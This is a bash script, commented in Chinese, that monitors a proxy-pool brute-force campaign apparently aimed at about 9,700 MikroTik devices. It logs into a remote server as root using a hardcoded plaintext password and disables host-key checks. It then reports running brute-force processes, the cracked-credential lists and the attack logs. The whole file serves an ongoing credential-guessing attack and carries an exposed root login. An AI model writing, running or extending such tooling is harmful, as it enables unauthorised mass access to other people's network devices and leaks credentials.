#!/bin/bash
# 监控修复版代理池爆破

TARGET_IP="82.29.71.156"
TARGET_USER="root"
TARGET_PASS='@admin123'

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

while true; do
    clear
    echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}    修复版代理池爆破监控${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
    echo ""
    
    # 运行状态
    PROCS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'ps aux | grep www_brute | grep -v grep | wc -l' 2>/dev/null)
    echo -e "${BLUE}[状态]${NC} 进程: ${GREEN}${PROCS}${NC}/15"
    
    # 成功数
    NEW=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'cat /root/mikrotik_ecsrp5_toolkit/results/proxy_success_fixed.txt 2>/dev/null | wc -l' 2>/dev/null)
    TOTAL=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; 2>/dev/null | sort -u | wc -l' 2>/dev/null)
    echo -e "${BLUE}[破解]${NC} 新发现: ${GREEN}${NEW}${NC} | 总计: ${GREEN}${TOTAL}${NC}"
    
    # 负载
    LOAD=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'uptime | awk -F"average:" "{print \$2}"' 2>/dev/null)
    echo -e "${BLUE}[负载]${NC}${LOAD}"
    
    echo ""
    echo -e "${YELLOW}[最新日志]${NC}"
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'tail -20 /root/mikrotik_ecsrp5_toolkit/proxy_brute_fixed.log 2>/dev/null' 2>/dev/null
    
    echo ""
    echo -e "${GREEN}[成功列表]${NC}"
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'cat /root/mikrotik_ecsrp5_toolkit/results/proxy_success_fixed.txt 2>/dev/null' 2>/dev/null
    
    echo ""
    echo -e "${BLUE}[信息]${NC} 代理池: 17个 | 目标: 9702个 | 10秒后刷新..."
    
    sleep 10
done
